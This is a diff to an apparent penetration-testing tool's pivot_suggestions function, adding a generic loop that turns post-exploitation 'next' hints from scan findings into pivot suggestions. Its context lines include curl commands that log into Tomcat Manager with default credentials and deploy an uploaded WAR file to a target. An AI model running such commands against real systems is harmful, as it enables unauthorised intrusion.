@@ -466,6 +466,26 @@ def pivot_suggestions(host: str, open_ports: List[int],
                 f"curl -u tomcat:tomcat http://{host}:8080/manager/text/deploy?path=/s --upload-file s.war",
                 f"curl http://{host}:8080/s/"]}))
 
+    # everything above is a hand-built chain for one specific attack. below
+    # catches whatever's left with a 'next' hint sitting in its data that
+    # nothing above already surfaced - ftp-anon/mongo-unauth/ldap-anon/
+    # telnet-brute all set one and used to just get dropped on the floor,
+    # and now cve templates can carry their own pivot: block and land here
+    # too instead of needing a hardcoded case added per template.
+    _handled = {"redis-rce", "eternalblue", "tomcat-manager"}
+    seen = set()
+    for r in vulns:
+        if not r.data:
+            continue
+        vector = r.data.get("attack") or r.data.get("template_id", "")
+        next_steps = r.data.get("next")
+        if not next_steps or vector in _handled or vector in seen:
+            continue
+        seen.add(vector)
+        out.append(ScanResult("active:pivot", host, r.port, "PIVOT", r.severity,
+            f"{r.detail.split('[')[0].strip()} → next steps",
+            {"vector": vector, "commands": next_steps}))
+
     return out
 
 
